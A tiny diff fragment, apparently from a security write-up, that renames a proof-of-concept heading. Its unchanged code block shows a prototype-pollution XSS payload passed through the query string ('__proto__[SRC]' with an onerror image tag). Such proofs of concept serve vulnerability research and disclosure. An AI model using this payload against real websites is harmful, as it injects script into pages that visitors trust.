@@ -42,7 +42,7 @@ a.prototype._writeScriptToken = function f(e, n) {
 ```
 
 
-#### PoC #1
+#### PoC #2
 ```
 ?__proto__[SRC]=<img/src/onerror%3dalert(1)>
 ```
